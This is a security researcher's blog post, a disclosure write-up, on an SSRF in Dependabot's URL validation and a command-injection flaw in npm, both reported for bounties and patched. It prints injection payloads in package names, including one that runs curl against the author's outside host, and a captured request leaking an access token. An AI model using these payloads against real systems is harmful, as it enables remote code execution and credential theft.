<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width"><script type=application/javascript src=https://blog.tyage.net/js/theme-mode.js></script>
<link rel=stylesheet href=https://blog.tyage.net/css/frameworks.min.css><link rel=stylesheet href=https://blog.tyage.net/css/github.min.css><link rel=stylesheet href=https://blog.tyage.net/css/github-style.css><link rel=stylesheet href=https://blog.tyage.net/css/light.css><link rel=stylesheet href=https://blog.tyage.net/css/dark.css><link rel=stylesheet href=https://blog.tyage.net/css/syntax.css><title>Diving into Dependabot along with a bug in npm - blog.tyage.net</title><link rel=icon type=image/x-icon href=https://blog.tyage.net/images/favicon.ico><meta name=theme-color content="#1e2327"><script>const match=location.search.match(/^\?p=(\d+)\/?$/);if(location.pathname==="/"&&match!==null){const e=match[1];history.replaceState({previousUrl:location.href},"",`/%3fp=${e}/`),location.reload()}else history.state!==null&&history.state.previousUrl&&history.replaceState({},"",history.state.previousUrl)</script><style>.blog-post p{line-height:1.8}</style><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1507795450221855" crossorigin=anonymous></script></head><body><div style=position:relative><header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on"><div class="Header-item mobile-none" style=margin-top:-4px;margin-bottom:-4px><a class=Header-link href=https://blog.tyage.net/><svg class="octicon" height="32" viewBox="0 0 16 16" width="32"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a></div><div class="Header-item d-md-none"><button class="Header-link btn-link js-details-target" type=button onclick='document.querySelector("#header-search").style.display=document.querySelector("#header-search").style.display=="none"?"block":"none"'><svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M1 2.75A.75.75.0 011.75 2h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 2.75zm0 5A.75.75.0 011.75 7h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 7.75zM1.75 12a.75.75.0 100 1.5h12.5a.75.75.0 100-1.5H1.75z"/></svg></button></div><div style=display:none id=header-search class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex"><div class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to"><div class=position-relative><form target=_blank action=https://www.google.com/search accept-charset=utf-8 method=get autocomplete=off><label class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center"><input type=text class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable" name=q placeholder=Search autocomplete=off>
<input type=hidden name=q value=site:https://blog.tyage.net/></label></form></div></div></div><div class="Header-item Header-item--full flex-justify-center d-md-none position-relative"><a class=Header-link href=https://blog.tyage.net/><svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" width="32"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a></div><div class=Header-item style=margin-right:0><a href=javascript:void(0) class="Header-link no-select" onclick=switchTheme()><svg style="fill:var(--color-profile-color-modes-toggle-moon)" class="no-select" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.52208 7.71754c3.05612.0 5.53362-2.47748 5.53362-5.5336C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961 9.95801 1.07727 10.3495.771159 10.6474.99992c1.4679 1.12724 2.4141 2.90007 2.4141 4.89391.0 3.40575-2.7609 6.16667-6.16665 6.16667-2.94151.0-5.40199-2.0595-6.018122-4.81523C.794841 6.87902 1.23668 6.65289 1.55321 6.85451 2.41106 7.40095 3.4296 7.71754 4.52208 7.71754z"/></svg></a></div></header></div><div><main><div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4"><div class=px-0><div class="mb-3 d-flex px-3 px-md-3 px-lg-5"><div class="flex-auto min-width-0 width-fit mr-3"><div class=d-flex><div class="d-none d-md-block"><a class="avatar mr-2 flex-shrink-0" href=https://blog.tyage.net/><img class=avatar-user src=/icon/icon.jpg width=32 height=32></a></div><div class="d-flex flex-column"><h1 class="break-word f3 text-normal mb-md-0 mb-1"><span class=author><a href=https://blog.tyage.net/>tyage</a></span><span class=path-divider>/</span><strong class="css-truncate-target mr-1" style=max-width:410px><a href=https://blog.tyage.net/post/2021-06-27-dependabot-rce/>Diving into Dependabot along with a bug in npm</a></strong></h1><div class="note m-0">Created <relative-time datetime="Mon, 12 Jul 2021 23:30:00 +0900" class=no-wrap>Mon, 12 Jul 2021 23:30:00 +0900</relative-time></div></div></div></div></div></div></div><div class="container-lg px-3 new-discussion-timeline"><div class="repository-content gist-content"><div><div class="js-gist-file-update-container js-task-list-container file-box"><div id=file-pytest class="file my-2"><div id=post-header class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style=z-index:2><div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto"><div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0"><summary id=toc-toggle onclick=clickToc() class="btn btn-octicon m-0 mr-2 p-2"><svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered"><path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zM3 8A1 1 0 111 8a1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"/></svg></summary><details-menu class=SelectMenu id=toc-details style="display: none;"><div class="SelectMenu-modal rounded-3 mt-1" style=max-height:340px><div class="SelectMenu-list SelectMenu-list--borderless p-2" style=overscroll-behavior:contain id=toc-list></div></div></details-menu>1009 Words</div><div class="file-actions flex-order-2 pt-0"></div></div></div><div class="Box-body px-5 pb-5" style=z-index:1><article class="markdown-body entry-content container-lg"><p>If you are developing some applications on GitHub, you might have seen pull requests from Depedabot.
It automatically finds outdated vulnerable packages and sends pull requests to fix that.</p><p><img src=screenshot1.png alt></p><p>It is enabled by default and can make a commit on <code>dependabot/*</code> branch of many repositories on GitHub.
Therefore, I thought If I could gain a controll of Dependabot, I can steal write permissions of those repositories.
So I started to look into Dependabot.</p><h1 id=ssrf-in-dependabot>SSRF in Dependabot</h1><p>The core module of the Dependabot is open-sourced (<a href=https://github.com/dependabot/dependabot-core>https://github.com/dependabot/dependabot-core</a>), so we can use Dependabot outside of GitHub.
To start the investigation, I prepared an local Dependabot environment following <a href=https://github.com/dependabot/dependabot-script>the official sample code</a>.</p><p>This sample code requires GitHub access token to fetch the source code of the repository.</p><script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23"></script><p>My first idea is to deceiving a Dependabot so that the bot will sends the token to my server instead of GitHub.
This idea seems possible because there are flaws in URL validations.</p><p>One of the validations is to check whether the URL contains <code>github.com</code> or not.
Obviously, this validation accepts a URL such as <code>github.com.mocos.kitchen</code>.</p><script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb?slice=7:8"></script>
<script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb?slice=54:55"></script><p>Another one uses following regexp which accepts a URL such as <code>git+https://github.com.mocos.kitchen/username/repo</code>.</p><script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37"></script><p>Based on these tricks, Dependabot treats <code>git+https://github.com.mocos.kitchen/username/repo</code> as a valid GitHub&rsquo;s URL.</p><h2 id=token-stealing-demo>Token stealing demo</h2><p>To proof this concept, I created <a href=https://github.com/tyage/dependabot-test-app>a sample repository</a> that includes following <code>package.json</code> file.</p><script src=https://gist-it.appspot.com/https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json></script><p>Next, I updated the <code>credentials</code>, <code>repo_name</code> and <code>dependency_name</code> in <a href=https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb>update-scripts.rb</a> from the official sample code so that we can run dependency checker against the sample repository I created.
When I run the script, my server - <code>github.com.mocos.kitchen</code> - received a request containing GitHub Access Token.</p><p>It means, if someone run a dependency checker against malicious repository, their GitHub Access Token will be stolen!</p><pre tabindex=0><code>GET /username/repo.git/info/refs?service=git-upload-pack HTTP/1.0
Host: localhost:3000
Connection: close
User-Agent: dependabot-core/0.142.0 excon/0.79.0 ruby/2.6.6 (x86_64-darwin20) (+https://github.com/dependabot/dependabot-core)
Authorization: Basic eC1hY2Nlc3MtdG9rZW46Z2hw*************************************
Accept-Encoding: deflate, gzip
</code></pre><h2 id=first-dive-into-a-dependabot-server>First dive into a Dependabot server</h2><p>Next, in order to try this attack in GitHub environment, I enabled Dependabot alerts in the sample repository.
We can do this by simply creating a <code>.github/dependabot.yml</code> file.</p><script src=https://gist-it.appspot.com/https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml></script><p>I successfully received a HTTP request from a Dependabot in GitHub.
But contrary to my expectation, there is no GitHub Access Token in the request.
Afterwards, it turns out that those servers are using special HTTP proxy which enalbes the bot to access target repository without GitHub Access Token.</p><pre tabindex=0><code>GET /username/repo.git/info/refs?service=git-upload-pack HTTP/1.0
Host: localhost:3000
Connection: close
User-Agent: dependabot-core/0.156.4 excon/0.83.0 ruby/2.7.1 (x86_64-linux-gnu) (+https://github.com/dependabot/dependabot-core)
Accept-Encoding: gzip
</code></pre><p>I couldn&rsquo;t steal the token from GitHub&rsquo;s Dependabot server by SSRF, but after some investigation, I found another bug.</p><h1 id=get-the-shell-of-a-dependabot-server>Get the shell of a Dependabot server</h1><p>When I tried some payload, I came across with a pattern that triggers a shell command in Dependabot server.
With the package name <code>https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/...</code>, a shell command <code>curl$IFS@mocos.kitchen:3001</code> was executed and we could see the request!</p><script src=https://gist-it.appspot.com/https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json></script><p>I got the shell of the Dependabot server suddenly, but unfortunately, what we can do in the server is limited.
Here is what I could do:</p><ul><li>Access to the internal HTTP proxy which enables us to access to the target GitHub repository</li><li>Access to the internal API server which enalbes us to create a pull request as a Dependabot</li><li>Bitcoin mining :)</li></ul><p>Therefore, we couldn&rsquo;t obtain read/write access of other user&rsquo;s repository.
(If we can pwn the internal HTTP proxy or API server, it will allow us to escalate the permission, I guess.)</p><p>Even though I couldn&rsquo;t get the access to other user&rsquo;s repository, I could impersonate as a verified Dependabot account and create a commit and pull request by calling internal API.</p><p><a href=https://github.com/tyage/dependabot-test3/pull/31>https://github.com/tyage/dependabot-test3/pull/31</a></p><p><img src=screenshot2.png alt=https://github.com/tyage/dependabot-test3/pull/31></p><p><img src=screenshot3.png alt=https://github.com/tyage/dependabot-test3/pull/31></p><h2 id=rce-in-npm>RCE in npm</h2><p>By the way, what was happend to Dependabot when I changed the package name to <code>https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);...</code>?
I found that the command was executed in <code>run_npm_7_top_level_updater</code> method.
In this method, the bot runs <code>npm install</code> command with <code>--ignore-scripts --package-lock-only</code> arguments so that it can see if the lock file is updated without running install scripts.</p><script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb?slice=182:193"></script><p>Therefore, I thought Dependabot doesn&rsquo;t escape the arguments, but it does properly escapes all command arguments.</p><script src="https://gist-it.appspot.com/https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb?slice=273:274"></script><p>So I manually run <code>npm install</code> command to see what was happened and&mldr;</p><pre tabindex=0><code>$ npm install &#39;git+https://github.com/tyage/sample-package;echo HELLO &gt; a;&#39; --ignore-scripts
npm ERR! code 127
npm ERR! command failed
npm ERR! command git ls-remote ssh://git@github.com/tyage/sample-package;echo HELLO &gt; a; .git
npm ERR! 8b7e1769b6df4461c8e89e6d0a2035c4512409cd HEAD
npm ERR! 8b7e1769b6df4461c8e89e6d0a2035c4512409cd refs/heads/main
npm ERR! 8b7e1769b6df4461c8e89e6d0a2035c4512409cd refs/tags/4.0.0
npm ERR! 8b7e1769b6df4461c8e89e6d0a2035c4512409cd refs/tags/5.0.0
npm ERR! zsh:1: command not found:  .git

npm ERR! A complete log of this run can be found in:
npm ERR!     /Users/tyage/.npm/_logs/2021-04-06T09_39_20_675Z-debug.log
$ cat a
HELLO
</code></pre><p>Yes, the bug is in npm!
Even if there is a <code>--ignore-scripts</code> option, we can execute a shell command injected in a package name!</p><p>When we call <code>npm install</code> command with <code>git+https://...</code> package name, <code>git ls-remote</code> command is triggered using <code>child_process.spawn</code> method.</p><script src="https://gist-it.appspot.com/https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js?slice=35:36"></script><p>Also, if <code>child_process.spawn</code> method is called with <code>shell</code> option, <a href=https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options>the command will be run inside of the shell</a>.</p><p>npm passes <code>opts</code> variable, which contains npm config, as an option argument.
It means <code>opts.shell</code> is same with <a href=https://docs.npmjs.com/cli/v7/using-npm/config#shell><code>shell</code> config</a> which default value is a <code>$SHELL</code> environment variable or <code>bash</code> on Posix</p><p>You can see your config of the npm with <code>npm config</code> command.</p><pre tabindex=0><code>$ npm config get shell
/bin/zsh
</code></pre><p>Summarizing the above, npm calls <code>child_process.spawn</code> so that they can execute <code>git ls-remote 'git+https://....'</code>, but since they set the <code>shell</code> option, malicious shell command - starts from <code>;</code> or <code>$(</code> - in the package name is evaluated.</p><p>I reported this bug to the teams and <a href=https://github.com/npm/git/pull/29>it was resolved in npm 7.10.0</a>.
I asked if they issue CVE but they answered they will not.</p><p>But as you know, the action &ldquo;installing a malicious npm package&rdquo; itself is already dangerous, so this bug only affects to limited situations such as a dependency checker.</p><h1 id=timeline>Timeline</h1><p>I reported SSRF to Dependabot and RCE to npm, and received bounties $617 and $7,500 respectively.</p><p>Interestingly, both of them are in the scope of <a href=https://hackerone.com/github>GitHub Bug Bounty Program</a>.</p><p>Report to Dependabot:</p><ul><li><strong>2021/03/31 08:50:30 UTC</strong> Reported Dependabot issue</li><li><strong>2021/04/23 09:54:22 UTC</strong> Bounty Rewarded</li></ul><p>Report to npm:</p><ul><li><strong>2021/04/06 10:23:49 UTC</strong> Reported npm issue</li><li><strong>2021/04/07 17:53:57 UTC</strong> Issue triaged</li><li><strong>2021/04/28 19:41:59 UTC</strong> Issue patched</li><li><strong>2021/05/04 14:42:21 UTC</strong> Bounty Rewarded</li></ul></article></div></div></div></div></div></div></main></div><script type=application/javascript src=https://blog.tyage.net/js/toc.js></script>
<link rel=stylesheet href=https://blog.tyage.net/css/toc.css><div class="footer container-xl width-full p-responsive"><div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light"><a aria-label=Homepage title=GitHub class="footer-octicon d-none d-lg-block mr-lg-4" href=https://blog.tyage.net/><svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a><ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0"><li class="mr-3 mr-lg-0">Theme by <a href=https://github.com/MeiK2333/github-style>github-style</a></li></ul></div><div class="d-flex flex-justify-center pb-6"><span class="f6 text-gray-light"></span></div></div></body><script type=application/javascript src=https://blog.tyage.net/js/github-style.js></script></html>